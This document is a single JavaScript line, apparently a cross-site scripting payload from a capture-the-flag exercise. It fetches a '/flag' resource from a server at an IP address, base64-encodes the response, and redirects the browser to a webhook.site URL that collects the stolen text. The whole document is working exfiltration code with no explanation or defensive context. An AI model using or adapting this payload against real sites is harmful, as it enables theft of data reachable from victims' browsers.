fetch(`http://165.232.190.5:1900/flag`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://webhook.site/10742b6c-2f72-4215-a644-6c7c11cfd1dd/flag=?`+btoa(txt)})
